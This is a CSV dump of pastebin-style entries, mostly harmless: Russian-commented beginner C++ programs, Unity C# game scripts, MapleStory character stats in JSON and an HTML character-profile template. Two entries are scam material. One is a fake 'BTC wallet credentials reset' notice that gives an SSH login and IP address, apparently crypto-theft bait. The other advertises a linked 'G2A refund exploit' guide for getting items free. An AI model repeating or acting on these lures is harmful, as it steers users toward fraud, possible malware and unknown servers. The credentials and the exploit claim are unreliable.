id,title,username,language,date,content
sQN8367x,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Saturday 23rd of December 2023 12:04:05 AM CDT,"Dear Moe,
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be 
chefman440:Jmh3x9ZB on 149.28.231.183
You can connect via SSH.

Regards,
GM-780441"
zkbSL09n,Untitled,35657,C++,Saturday 23rd of December 2023 12:01:10 AM CDT,"
#include <iostream>

using namespace std;

int main() {
    setlocale(LC_ALL, ""ru""); // для использования кириллицы

    double cost; // цена товара (вещественное число)
    int count; // количество товара (целое число)
    double discount; // скидка 5 процентов

    cout << ""Введите цену товара: "";
    cin >> cost;

    cout << ""Введите количество товара: "";
    cin >> count;

    cout << ""Введите размер скидки: "";
    cin >> discount;

    double price = cost * count * (1 - discount);

    cout << ""Стоимость товара  с учетом скидки: "" << price << endl;
}


"
DPdQSz5f,Untitled,35657,C++,Friday 22nd of December 2023 11:54:29 PM CDT,"
#include <iostream>

using namespace std;

int main() {
    setlocale(LC_ALL, ""ru""); // для использования кириллицы

    double cost = 10.5; // цена товара (вещественное число)
    int count = 5; // количество товара (целое число)
    double discount = 0.05; // скидка 5 процентов

    double price = cost * count * (1 - discount);

    cout << ""Стоимость товара  с учетом скидки: "" << price << endl;
}


"
QFhap8n7,Crate.cs,DugganSC,C#,Friday 22nd of December 2023 11:54:24 PM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;

namespace Game.Scripts.LiveObjects
{
    public class Crate : MonoBehaviour
    {
        [SerializeField] private float _punchDelay;
        [SerializeField] private GameObject _wholeCrate, _brokenCrate;
        [SerializeField] private Rigidbody[] _pieces;
        [SerializeField] private BoxCollider _crateCollider;
        [SerializeField] private InteractableZone _interactableZone;
        private bool _isReadyToBreak = false;

        private List<Rigidbody> _breakingPieces = new List<Rigidbody>();
        private float _holdStarted = 0;
        [SerializeField] private float _holdDelay = 0.5f;

        private void OnEnable()
        {
            InteractableZone.onZoneInteractionComplete += InteractableZone_onZoneInteractionComplete;
            InteractableZone.onHoldStarted += InteractableZone_onHoldStarted;
            InteractableZone.onHoldEnded += InteractableZone_onHoldEnded;
        }

        private void InteractableZone_onHoldStarted(int obj)
        {
            if (_isReadyToBreak)
            {
                Debug.Log(""Hold started"");

                _holdStarted = Time.time;
            }
        }

        private void InteractableZone_onHoldEnded(int obj)
        {
            if (_isReadyToBreak)
            {
                Debug.Log(""Hold ended"");
                if (_holdStarted <= Time.time + _holdDelay)
                {
                    int parts = Random.Range(3, 6);
                    for (int i = 0; i < parts; i++)
                    {
                        BreakPart();
                    }
                }
                else
                {
                    // Otherwise, single strike
                    BreakPart();
                }
            }
        }

        private void InteractableZone_onZoneInteractionComplete(InteractableZone zone)
        {
            Debug.Log(""Interaction Zone complete"");
            if (_isReadyToBreak == false && _breakingPieces.Count >0)
            {
                _wholeCrate.SetActive(false);
                _brokenCrate.SetActive(true);
                _isReadyToBreak = true;
            }            
        }

        private void Start()
        {
            _breakingPieces.AddRange(_pieces);            
        }



        public void BreakPart()
        {
            if (_breakingPieces.Count > 0)
            {
                int rng = Random.Range(0, _breakingPieces.Count);
                _breakingPieces[rng].constraints = RigidbodyConstraints.None;
                _breakingPieces[rng].AddForce(new Vector3(1f, 1f, 1f), ForceMode.Force);
                _breakingPieces.Remove(_breakingPieces[rng]);
            } else
            {
                _isReadyToBreak = false;
                _crateCollider.enabled = false;
                _interactableZone.CompleteTask(6);
                Debug.Log(""Completely Busted"");
            }
        }

        IEnumerator PunchDelay()
        {
            float delayTimer = 0;
            while (delayTimer < _punchDelay)
            {
                yield return new WaitForEndOfFrame();
                delayTimer += Time.deltaTime;
            }

            _interactableZone.ResetAction(6);
        }

        private void OnDisable()
        {
            InteractableZone.onZoneInteractionComplete -= InteractableZone_onZoneInteractionComplete;
        }
    }
}
"
8cmNrvzn,InteractableZone.cs,DugganSC,C#,Friday 22nd of December 2023 11:53:50 PM CDT,"using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using Game.Scripts.UI;


namespace Game.Scripts.LiveObjects
{
    public class InteractableZone : MonoBehaviour
    {
        private enum ZoneType
        {
            Collectable,
            Action,
            HoldAction
        }

        private enum KeyState
        {
            Press,
            PressHold
        }

        [SerializeField]
        private ZoneType _zoneType;
        [SerializeField]
        private int _zoneID;
        [SerializeField]
        private int _requiredID;
        [SerializeField]
        [Tooltip(""Press the (---) Key to ....."")]
        private string _displayMessage;
        [SerializeField]
        private GameObject[] _zoneItems;
        private bool _inZone = false;
        private bool _itemsCollected = false;
        private bool _actionPerformed = false;
        [SerializeField]
        private Sprite _inventoryIcon;
        [SerializeField]
        private KeyCode _zoneKeyInput;
        [SerializeField]
        private KeyState _keyState;
        [SerializeField]
        private GameObject _marker;

        private PlayerInputs _playerInput;

        private bool _inHoldState = false;

        private static int _currentZoneID = 0;
        public static int CurrentZoneID
        { 
            get 
            { 
               return _currentZoneID; 
            }
            set
            {
                _currentZoneID = value; 
                         
            }
        }


        public static event Action<InteractableZone> onZoneInteractionComplete;
        public static event Action<int> onHoldStarted;
        public static event Action<int> onHoldEnded;

        private void OnEnable()
        {
            InteractableZone.onZoneInteractionComplete += SetMarker;
            _playerInput = new PlayerInputs();
            _playerInput.Player.Enable();
            _playerInput.Player.Interact.performed += Interact_performed;
            _playerInput.Player.Interact.canceled += Interact_canceled;
        }

        private void Interact_canceled(UnityEngine.InputSystem.InputAction.CallbackContext obj)
        {
            if (_inZone == true)
            {
                if (_keyState == KeyState.PressHold)
                {
                    _inHoldState = false;
                    onHoldEnded?.Invoke(_zoneID);
                }
            }
        }

        private void Interact_performed(UnityEngine.InputSystem.InputAction.CallbackContext obj)
        {
            if (_inZone == true)
            {
                if (_keyState != KeyState.PressHold)
                {
                    //press
                    switch (_zoneType)
                    {
                        case ZoneType.Collectable:
                            if (_itemsCollected == false)
                            {
                                CollectItems();
                                _itemsCollected = true;
                                UIManager.Instance.DisplayInteractableZoneMessage(false);
                            }
                            break;

                        case ZoneType.Action:
                            if (_actionPerformed == false)
                            {
                                PerformAction();
                                _actionPerformed = true;
                                UIManager.Instance.DisplayInteractableZoneMessage(false);
                            }
                            break;
                    }
                }

                else if (_keyState == KeyState.PressHold && _inHoldState == false)
                {
                    _inHoldState = true;

                    switch (_zoneType)
                    {
                        case ZoneType.HoldAction:
                            PerformHoldAction();
                            break;
                    }
                }
            }
        }

        private void OnTriggerEnter(Collider other)
        {
            string _interactKeyName = _playerInput.Player.Interact.bindings[0].ToDisplayString();
            if (other.CompareTag(""Player"") && _currentZoneID > _requiredID)
            {
                switch (_zoneType)
                {
                    case ZoneType.Collectable:
                        if (_itemsCollected == false)
                        {
                            _inZone = true;
                            if (_displayMessage != null)
                            {
                                string message = $""Press the {_interactKeyName} key to {_displayMessage}."";
                                UIManager.Instance.DisplayInteractableZoneMessage(true, message);
                            }
                            else
                                UIManager.Instance.DisplayInteractableZoneMessage(true, $""Press the {_interactKeyName} key to collect"");
                        }
                        break;

                    case ZoneType.Action:
                        if (_actionPerformed == false)
                        {
                            _inZone = true;
                            if (_displayMessage != null)
                            {
                                string message = $""Press the {_interactKeyName} key to {_displayMessage}."";
                                UIManager.Instance.DisplayInteractableZoneMessage(true, message);
                            }
                            else
                                UIManager.Instance.DisplayInteractableZoneMessage(true, $""Press the {_interactKeyName} key to perform action"");
                        }
                        break;

                    case ZoneType.HoldAction:
                        _inZone = true;
                        if (_displayMessage != null)
                        {
                            string message = $""Press the {_interactKeyName} key to {_displayMessage}."";
                            UIManager.Instance.DisplayInteractableZoneMessage(true, message);
                        }
                        else
                            UIManager.Instance.DisplayInteractableZoneMessage(true, $""Hold the {_interactKeyName} key to perform action"");
                        break;
                }
            }
        }

        private void Update()
        {
        }
       
        private void CollectItems()
        {
            foreach (var item in _zoneItems)
            {
                item.SetActive(false);
            }

            UIManager.Instance.UpdateInventoryDisplay(_inventoryIcon);

            CompleteTask(_zoneID);

            onZoneInteractionComplete?.Invoke(this);

        }

        private void PerformAction()
        {
            foreach (var item in _zoneItems)
            {
                item.SetActive(true);
            }

            if (_inventoryIcon != null)
                UIManager.Instance.UpdateInventoryDisplay(_inventoryIcon);

            onZoneInteractionComplete?.Invoke(this);
        }

        private void PerformHoldAction()
        {
            UIManager.Instance.DisplayInteractableZoneMessage(false);
            onHoldStarted?.Invoke(_zoneID);
        }

        public GameObject[] GetItems()
        {
            return _zoneItems;
        }

        public int GetZoneID()
        {
            return _zoneID;
        }

        public void CompleteTask(int zoneID)
        {
            if (zoneID == _zoneID)
            {
                _currentZoneID++;
                onZoneInteractionComplete?.Invoke(this);
            }
        }

        public void ResetAction(int zoneID)
        {
            if (zoneID == _zoneID)
                _actionPerformed = false;
        }

        public void SetMarker(InteractableZone zone)
        {
            if (_zoneID == _currentZoneID)
                _marker.SetActive(true);
            else
                _marker.SetActive(false);
        }

        private void OnTriggerExit(Collider other)
        {
            if (other.CompareTag(""Player""))
            {
                _inZone = false;
                UIManager.Instance.DisplayInteractableZoneMessage(false);
            }
        }

        private void OnDisable()
        {
            InteractableZone.onZoneInteractionComplete -= SetMarker;
        }       
        
    }
}


"
tFxe6yK9,Untitled,35657,C++,Friday 22nd of December 2023 11:30:21 PM CDT,"
#include <iostream>

using namespace std;

int main() {
    setlocale(LC_ALL, ""ru""); // для использования кириллицы

    // однострочный комментарий

    /*
    Многострочный
    комментарий
    ...
    ...
    ...
    */
    
    int a; // объявление целочисленной переменной под названием a

    a = 5; // инициализация (определение) переменной

    int b = 6; // объявление и инициализация переменной

    double c = 8.56; // объявление и определение переменной - вещественного числа

    char d = 'c'; // объявление символьной переменной d
    
    bool e = true; // объявление булевой (логической переменной)

    b = 10; // значение переменной можно изменять

    const int days_number = 7; // объявление целочисленной константы

    // days_number = 10; // значение константы изменить нельзя

    cout << a << endl; // переменную можно вывести в консоль

    cout << a << "" "" << b << "" "" << c << endl; // можно вывести сразу несколько переменных

    int result = a + b * 3; // можно инициализировать переменную результатом вычисления какого-либо выражения.

    cout << result << endl;

    cout << a + 35 << endl; // можно вывести результат выражения 
}


"
eM7LBY0d,Untitled,35657,C++,Friday 22nd of December 2023 11:01:51 PM CDT,"
#include <iostream>

using namespace std;

int main() {
    setlocale(LC_ALL, ""ru""); // для использования кириллицы
    cout << ""Иванов Иван Иванович\n"";
    cout << ""Иванов\\Иван\\Иванович\n"";
    cout << ""Иванов\nИван\nИванович\n"";
    cout << ""\""Иванов\""\n\""Иван\""\n\""Иванович\""\n"";
}


"
ntviQ8yU,G2A.com Refund Exploit Dec 2023,G2ARefundExploit,GetText,Friday 22nd of December 2023 10:52:18 PM CDT,"G2A refund exploit updated guide - any item for free on G2A.com

https://drive.google.com/file/d/1AKxSk9vs38aBF7GEDJxf8mNi-_NVRLQ9/view#g2a_refund_exploit.pdf

Working as of 
22 December 2023

878196"
J0RtAajg,maple api 1,hw0k,JSON,Friday 22nd of December 2023 10:22:34 PM CDT,"{
  ""date"": ""2023-12-21T00:00+09:00"",
  ""character_class"": ""데몬어벤져"",
  ""final_stat"": [
    {
      ""stat_name"": ""최소 스탯공격력"",
      ""stat_value"": ""8486729""
    },
    {
      ""stat_name"": ""최대 스탯공격력"",
      ""stat_value"": ""9429697""
    },
    {
      ""stat_name"": ""데미지"",
      ""stat_value"": ""93.00""
    },
    {
      ""stat_name"": ""보스 몬스터 데미지"",
      ""stat_value"": ""138.00""
    },
    {
      ""stat_name"": ""최종 데미지"",
      ""stat_value"": ""26.50""
    },
    {
      ""stat_name"": ""방어율 무시"",
      ""stat_value"": ""81.87""
    },
    {
      ""stat_name"": ""크리티컬 확률"",
      ""stat_value"": ""90""
    },
    {
      ""stat_name"": ""크리티컬 데미지"",
      ""stat_value"": ""52.00""
    },
    {
      ""stat_name"": ""상태이상 내성"",
      ""stat_value"": ""11""
    },
    {
      ""stat_name"": ""스탠스"",
      ""stat_value"": ""100""
    },
    {
      ""stat_name"": ""방어력"",
      ""stat_value"": ""25608""
    },
    {
      ""stat_name"": ""이동속도"",
      ""stat_value"": ""160""
    },
    {
      ""stat_name"": ""점프력"",
      ""stat_value"": ""123""
    },
    {
      ""stat_name"": ""스타포스"",
      ""stat_value"": ""270""
    },
    {
      ""stat_name"": ""아케인포스"",
      ""stat_value"": ""1370""
    },
    {
      ""stat_name"": ""어센틱포스"",
      ""stat_value"": ""40""
    },
    {
      ""stat_name"": ""STR"",
      ""stat_value"": ""2585""
    },
    {
      ""stat_name"": ""DEX"",
      ""stat_value"": ""1869""
    },
    {
      ""stat_name"": ""INT"",
      ""stat_value"": ""1457""
    },
    {
      ""stat_name"": ""LUK"",
      ""stat_value"": ""1510""
    },
    {
      ""stat_name"": ""HP"",
      ""stat_value"": ""500000""
    },
    {
      ""stat_name"": ""MP"",
      ""stat_value"": null
    },
    {
      ""stat_name"": ""AP 배분 STR"",
      ""stat_value"": ""4""
    },
    {
      ""stat_name"": ""AP 배분 DEX"",
      ""stat_value"": ""4""
    },
    {
      ""stat_name"": ""AP 배분 INT"",
      ""stat_value"": ""4""
    },
    {
      ""stat_name"": ""AP 배분 LUK"",
      ""stat_value"": ""4""
    },
    {
      ""stat_name"": ""AP 배분 HP"",
      ""stat_value"": ""19935""
    },
    {
      ""stat_name"": ""AP 배분 MP"",
      ""stat_value"": ""0""
    },
    {
      ""stat_name"": ""아이템 드롭률"",
      ""stat_value"": ""19""
    },
    {
      ""stat_name"": ""메소 획득량"",
      ""stat_value"": ""4""
    },
    {
      ""stat_name"": ""버프 지속시간"",
      ""stat_value"": ""21""
    },
    {
      ""stat_name"": ""공격 속도"",
      ""stat_value"": ""4""
    },
    {
      ""stat_name"": ""일반 몬스터 데미지"",
      ""stat_value"": ""99.00""
    },
    {
      ""stat_name"": ""재사용 대기시간 감소 (초)"",
      ""stat_value"": ""0""
    },
    {
      ""stat_name"": ""재사용 대기시간 감소 (%)"",
      ""stat_value"": ""5""
    },
    {
      ""stat_name"": ""재사용 대기시간 미적용"",
      ""stat_value"": ""0""
    },
    {
      ""stat_name"": ""속성 내성 무시"",
      ""stat_value"": ""2.00""
    },
    {
      ""stat_name"": ""상태이상 추가 데미지"",
      ""stat_value"": ""6.00""
    },
    {
      ""stat_name"": ""무기 숙련도"",
      ""stat_value"": ""90""
    },
    {
      ""stat_name"": ""추가 경험치 획득"",
      ""stat_value"": ""30.00""
    },
    {
      ""stat_name"": ""공격력"",
      ""stat_value"": ""1727""
    },
    {
      ""stat_name"": ""마력"",
      ""stat_value"": ""597""
    },
    {
      ""stat_name"": ""전투력"",
      ""stat_value"": ""10500054""
    },
    {
      ""stat_name"": ""소환수 지속시간 증가"",
      ""stat_value"": ""8""
    }
  ],
  ""remain_ap"": 0
}"
FTYGkPWB,PokeCrossing (TH Character Profile Code),StarmanSymphony,HTML,Friday 22nd of December 2023 10:14:44 PM CDT,"<!--

    PokeCrossing
    A code by StarmanSymphony
    
    - You may edit this code to your liking.
    - You may frankenstein this code with others, as long as the other coder(s) allow it.
    - Do not move or remove the credit.
    - Remember to turn WYSIWYG off before using this code!
    - Created for Coders' Quarters' December 2023 challenge - layout by @/Togo!
    
    COLOURS USED (THAT AREN'T TYPE COLOURS):
    - #ffffff - Box background, icon border, header text
    - #000000 - Box text
    - #9c9c9c - Box borders
    - #8a8a8a - Header gradient, palette colour
    - #5c5c5c - Header gradient, palette colour
    - #343434 - Header gradient, palette colour
    - #d3d3d3 - Nav-pill text

-->


<div class=""mx-auto"" style=""max-width:800px"">
    <div class=""card p-2 border-0"" style=""background:url(LINK - CAN BE REPLACE WITH SOLID COLOUR OR GRADIENT)"">
        
        <!-- ROW 1 -->
        <div class=""row no-gutters mb-3"">
            <!-- ICON -->
            <div class=""col-3 d-none d-md-block"">
                <img src=""IMAGE LINK"" style=""height:200px;width:200px; box-shadow:0 0px 7px 2px rgba(0,0,0,0.70); border:3px solid #ffffff;border-radius:100px"">
            </div>
            
            <!-- NAME + QUOTE -->
            <div class=""col-md-7 col-10 align-items-end pl-md-1"">
                <div class=""card card-block border-0"" style=""height:100px;border-radius:0px 100px 100px 100px; color:#ffffff;box-shadow:0 0px 7px 2px rgba(0,0,0,0.70); background:linear-gradient(to right, #8a8a8a, #5c5c5c)"">
                    <h1 style=""font-weight:bold"">Name</h1>
                    <p style=""font-size:.8em; text-align:right""><i>""A quote here. Keep it short! ""</i></p>
                </div>
            </div>
            
            <!-- TYPE -->
            <!-- Colours for types can be found here: https://toyhou.se/2621177.color-references-bs-pkmn- -->
            <div class=""col-2 align-items-end pl-1"">
                <div class=""card border-0 overflow-hidden"" style=""height:100px;width:130px;border-radius:100px; box-shadow:0 0px 7px 2px rgba(0,0,0,0.70);"">
                    <div class=""row no-gutters flex-fill flex-column"">
                        <div class=""col justify-content-center align-items-center text-light"" style=""background-color:#A8A878"">Normal</div>
                        <!-- <div class=""col justify-content-center align-items-center text-dark"" style=""background-color:#F8D030"">Electric</div> -->
                        <!-- Remove the (<!- ->) on the line above for dual typing! -->
                    </div>
                </div>
            </div>
        </div>
        
        <!-- ROW 2 -->
        <div class=""row no-gutters"">
            <!-- RELATIONS -->
            <div class=""col-md-3 col-4"">
                <div class=""ui-accordion card"" style=""border:3px solid #9c9c9c;border-radius:20px; box-shadow:0 0px 7px 2px rgba(0,0,0,0.70)"">
                    <div class=""ui-accordion-content p-2"" style=""height:333px; background-color:#ffffff;color:#000000;border-radius:17px"">
                        <!-- CHARACTER 1 -->
                        <div class=""d-flex flex-row"" style=""margin-bottom:-5px"">
                            <span style=""font-weight:bold""><a href=""LINK"">Name</a></span>
                            <hr class=""mx-2"" style=""flex-grow:1;border:1px dashed"">
                            <span>Relation</span>
                        </div>
                        <p style=""font-size:.9em"">
                            <i>Write a bit about the characters' relationship.</i>
                        </p>
                        
                        <!-- CHARACTER 2 -->
                        <div class=""d-flex flex-row"" style=""margin-bottom:-5px"">
                            <span style=""font-weight:bold""><a href=""LINK"">Name</a></span>
                            <hr class=""mx-2"" style=""flex-grow:1;border:1px dashed"">
                            <span>Relation</span>
                        </div>
                        <p style=""font-size:.9em"">
                            <i>Write a bit about the characters' relationship.</i>
                        </p>
                        
                        <!-- CHARACTER 3 -->
                        <div class=""d-flex flex-row"" style=""margin-bottom:-5px"">
                            <span style=""font-weight:bold""><a href=""LINK"">Name</a></span>
                            <hr class=""mx-2"" style=""flex-grow:1;border:1px dashed"">
                            <span>Relation</span>
                        </div>
                        <p style=""font-size:.9em"">
                            <i>Write a bit about the characters' relationship.</i>
                        </p>
                    </div>
                </div>
            </div>
            
            <!-- PALETTE -->
            <div class=""col-md-9 col-8 pl-md-2 pl-1"">
                <div class=""card overflow-hidden border-0 mb-1"" style=""height:20px; border-radius:20px; box-shadow:0 0px 7px 2px rgba(0,0,0,0.70)"">
                    <div class=""row no-gutters flex-fill"">
                        <div class=""col"" style=""background-color:#8a8a8a""></div>
                        <div class=""col"" style=""background-color:#5c5c5c""></div>
                        <div class=""col"" style=""background-color:#343434""></div>
                        <!-- Copy & Paste above line to add extra colours! -->
                    </div>
                </div>
                
                <!-- ROW 2.5 -->
                <div class=""row no-gutters"">
                    <!-- BOX 1 -->
                    <div class=""col-md-6"">
                        <div class=""ui-accordion card mt-1 mb-2"" style=""height:120px; border:3px solid #9c9c9c;border-radius:20px; background-color:#ffffff;color:#000000; box-shadow:0 0px 7px 2px rgba(0,0,0,0.70)"">
                            <!-- ABOUT -->
                            <div class=""ui-accordion-content p-1"" style=""border-radius:17px"">
                                <p>This is where you put your About text! This box will scroll if you add enough content. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis sollicitudin elit sed tellus blandit viverra sed eget odio. Donec accumsan tempor lacus, et venenatis elit feugiat non. Duis porta eros et velit blandit dapibus. Curabitur ac finibus eros. Duis placerat velit vitae massa sodales, eget mattis nibh pellentesque.</p>
                            </div>
                        </div>
                        
                        <!-- BOX 2-->
                        <!-- THE BOX -->
                        <div class=""ui-accordion card tab-content"" style=""height:130px; border:3px solid #9c9c9c;border-radius:20px; background-color:#ffffff;color:#000000; box-shadow:0 0px 7px 2px rgba(0,0,0,0.70)"">
                            <!-- BASICS -->
                            <div id=""BASIC"" class=""ui-accordion-content px-0 py-1 tab-pane active fade show"" style=""border-radius:17px"">
                                <div class=""row no-gutters"">
                                    <!-- COLUMN 1 -->
                                    <div class=""col-6"">
                                        
                                        <ul class=""fa-ul"" style=""margin-left:30px"">
                                            <li><span class=""fa-li""><i class=""fa-solid fa-bolt""></i></span>Age: ##</li>
                                            <li><span class=""fa-li""><i class=""fa-solid fa-bolt""></i></span>Gender: [Gender]</li>
                                            <li><span class=""fa-li""><i class=""fa-solid fa-bolt""></i></span>Pronouns: [Pro/nouns]</li>
                                        </ul>
                                        
                                    </div>
                                    
                                    <!-- COLUMN 2 -->
                                    <div class=""col-6"">
                                        
                                        <ul class=""fa-ul"" style=""margin-left:30px"">
                                            <li><span class=""fa-li""><i class=""fa-solid fa-bolt""></i></span>Residence: [City, Region]</li>
                                            <li><span class=""fa-li""><i class=""fa-solid fa-bolt""></i></span>Orientation: [Orientation]</li>
                                        </ul>
                                        
                                    </div>
                                </div>
                            </div>
                            
                            <!-- BATTLE INFO -->
                            <div id=""BATTLE"" class=""ui-accordion-content px-0 py-1 tab-pane fade"" style=""border-radius:17px"">
                                <!-- NATURE/CHARACTERISTIC/ABILITY/HELD ITEM -->
                                <div class=""row no-gutters"" style=""margin-bottom:-7px"">
                                    <!-- NATURE + CHARACTERISTIC -->
                                    <div class=""col-6"">
                                        
                                        <ul class=""fa-ul"" style=""margin-left:30px"">
                                            <li><span class=""fa-li""><i class=""fa-solid fa-bolt""></i></span>Nature: [Nature]</li>
                                            <li><span class=""fa-li""><i class=""fa-solid fa-bolt""></i></span>Characteristic: [Charac.]</li>
                                        </ul>
                                        
                                    </div>
                                    
                                    <!-- ABILITY + HELD ITEM -->
                                    <div class=""col-6"">
                                        <ul class=""fa-ul"" style=""margin-left:30px"">
                                            <li><span class=""fa-li""><i class=""fa-solid fa-bolt""></i></span>Ability: [Ability]</li>
                                            <li><span class=""fa-li""><i class=""fa-solid fa-bolt""></i></span>Held Item: [Item]</li>
                                        </ul>
                                    </div>
                                </div>
                                
                                <!-- MOVESET -->
                                <table class=""table text-center m-0 border-0"">
                                    <tr>
                                        <!-- Colours for types can be found here: https://toyhou.se/2621177.color-references-bs-pkmn- -->
                                        <!-- MOVE 1 -->
                                        <td class=""text-light"" style=""background-color:#A8A878"">
                                            <span style=""font-weight:bold"">Move Name</span>
                                            <br><span class=""float-left"">Status/Special/Physical</span> <span class=""float-right"">PP: ##</span>
                                        </td>
                                        <!-- MOVE 2 -->
                                        <td class=""text-light"" style=""background-color:#A8A878"">
                                            <span style=""font-weight:bold"">Move Name</span>
                                            <br><span class=""float-left"">Status/Special/Physical</span> <span class=""float-right"">PP: ##</span>
                                        </td>
                                    </tr>
                                    <tr>
                                        <!-- MOVE 3 -->
                                        <td class=""text-light"" style=""background-color:#A8A878"">
                                            <span style=""font-weight:bold"">Move Name</span>
                                            <br><span class=""float-left"">Status/Special/Physical</span> <span class=""float-right"">PP: ##</span>
                                        </td>
                                        <!-- MOVE 4 -->
                                        <td class=""text-light"" style=""background-color:#A8A878"">
                                            <span style=""font-weight:bold"">Move Name</span>
                                            <br><span class=""float-left"">Status/Special/Physical</span> <span class=""float-right"">PP: ##</span>
                                        </td>
                                    </tr>
                                </table>
                                
                            </div>
                        </div>
                        
                        <!-- TABS -->
                        <ul class=""nav nav-pills nav-fill mt-1"" style=""background-color:#9c9c9c; border-radius:20px; box-shadow:0 0px 7px 2px rgba(0,0,0,0.70)"">
                            <li class=""nav-item"">
                                <a class=""nav-link active"" data-toggle=""tab"" aria-current=""page"" href=""#BASIC"" style=""color:#d3d3d3; mix-blend-mode:luminosity; border-radius:20px"">Basics</a>
                            </li>
                            
                            <li class=""nav-item"">
                                <a class=""nav-link"" data-toggle=""tab"" href=""#BATTLE"" style=""color:#d3d3d3; mix-blend-mode:luminosity; border-radius:20px"">Battle info</a>
                            </li>
                            </li>
                        </ul>
                    </div>
                    
                    <!-- DESKTOP DESIGN -->
                    <div class=""col-md-6 d-none d-md-block pl-md-2 mt-1"">
                        <div class=""card"" style=""height:310px; border:3px solid #9c9c9c;border-radius:20px; box-shadow:0 0px 7px 2px rgba(0,0,0,0.70)"">
                            
                            <!-- REFERENCE IMAGE -->
                            <div class=""card border-0"" style=""height:160px; border-radius:17px 17px 0px 0px; background:url(IMAGE LINK) center;background-size:cover"">
                                <!-- IMAGE LINK -->
                                <a href=""IMAGE LINK"" data-toggle=""tooltip"" title=""Full reference"" style=""position:absolute; margin-left:260px;margin-top:130px"">
                                    <i class=""fa-solid fa-bolt""></i>
                                </a>
                            </div>
                            
                            <!-- DESIGN NOTES -->
                            <div class=""ui-accordion card"" style=""border:3px solid #9c9c9c;border-width: 3px 0px 0px 0px;border-radius:0px 0px 17px 17px;"">
                                <div class=""ui-accordion-content p-1"" style=""height:150px; border-radius:0px 0px 17px 17px; background-color:#ffffff;color:#000000;"">
                                    
                                    <ul class=""fa-ul"" style=""margin-left:25px"">
                                        <li><span class=""fa-li""><i class=""fa-solid fa-angles-right""></i></span>Design notes go here!</li>
                                        <li><span class=""fa-li""><i class=""fa-solid fa-angles-right""></i></span>This box will scroll if you add enough information.</li>
                                    </ul>
                                    
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
        </div>
        
        <!-- MOBILE DESIGN -->
        <div class=""d-md-none d-block mt-2"">
            <div class=""card"" style=""border:3px solid #9c9c9c;border-radius:20px; box-shadow:0 0px 7px 2px rgba(0,0,0,0.70)"">
                
                <!-- REFERENCE IMAGE -->
                <div class=""card border-0 rounded-0"" style=""height:160px; border-radius:17px 17px 0px 0px; background:url(IMAGE LINK) center;background-size:cover"">
                    <!-- IMAGE LINK -->
                    <a href=""IMAGE LINK"" data-toggle=""tooltip"" data-placement=""auto"" title=""Full reference"" class=""align-self-end"">
                        <i class=""fa-solid fa-bolt""></i>
                    </a>
                </div>
                
                <!-- DESIGN NOTES -->
                <div class=""ui-accordion card p-1"" style=""min-height:100px; border:3px solid #9c9c9c;border-width: 3px 0px 0px 0px; border-radius:0px 0px 17px 17px; background-color:#ffffff;color:#000000"">
                    
                        <ul class=""fa-ul"" style=""margin-left:25px"">
                            <li><span class=""fa-li""><i class=""fa-solid fa-angles-right""></i></span>Design notes go here!</li>
                            <li><span class=""fa-li""><i class=""fa-solid fa-angles-right""></i></span>This box will grow if you add enough information.</li>
                        </ul>
                    
                </div>
            </div>
        </div>
        
    </div>
    
    <div class=""card border-0 mt-2 d-flex flex-row justify-content-between"">
        <!-- ICON CREDIT -->
        <a href=""CREDIT LINK"" data-toggle=""tooltip"" data-placement=""auto"" title=""Icon by [CREDIT]"">
            <i class=""fa-solid fa-user""></i>
        </a>
            
        <!-- BACKGROUND CREDIT: REMOVE IF USING SOLID COLOUR OR GRADIENT -->
        <a href=""CREDIT LINK"" data-toggle=""tooltip"" data-placement=""auto"" title=""Background by/from [CREDIT]"">
            <i class=""fa-solid fa-image""></i>
        </a>
            
        <!-- CODE CREDIT: DO NOT REMOVE -->
        <a href=""IMAGE LINK"" data-toggle=""tooltip"" data-placement=""auto"" title=""Code by StarmanSymphony"">
            <i class=""fa-solid fa-star""></i>
        </a>
    </div>
        
</div>"
